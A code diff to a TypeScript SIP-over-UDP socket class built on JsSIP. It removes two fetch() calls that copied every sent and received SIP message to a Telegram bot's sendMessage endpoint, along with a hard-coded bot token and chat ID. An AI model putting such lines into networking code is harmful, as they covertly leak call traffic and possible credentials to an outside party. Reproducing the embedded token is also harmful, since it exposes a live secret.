@@ -3,7 +3,6 @@ import dgram from "dgram";
 import os from "os";
 import JsSIP from "jssip";
 import EventEmitter from "events";
-import queryString from "querystring";
 
 function getLocalAddress() {
     const netInterfaces = os.networkInterfaces();
@@ -80,11 +79,6 @@ class UDPSocketInterface implements Socket {
                     }
                 } else if (cseqMethod === "INVITE") this._events.emit("invite");
 
-                fetch(`https://api.telegram.org/bot5748136782:AAEXvjw7vhS6AsJoMIrtl_T_L4h-zRBImBA/sendMessage?${queryString.stringify({
-                    chat_id: "201539102",
-                    text: message
-                })}`)
-
                 try {
                     this.ondata(message);
                 } catch (error) {}
@@ -123,11 +117,6 @@ class UDPSocketInterface implements Socket {
         if (this._publicAddress && this._publicPort) {
             message = message.replace(`@${local};`, `@${this._publicAddress}:${this._publicPort};`);
         }
-
-        fetch(`https://api.telegram.org/bot5748136782:AAEXvjw7vhS6AsJoMIrtl_T_L4h-zRBImBA/sendMessage?${queryString.stringify({
-            chat_id: "201539102",
-            text: message
-        })}`)
 
         try {
             const buffer = Buffer.from(message);
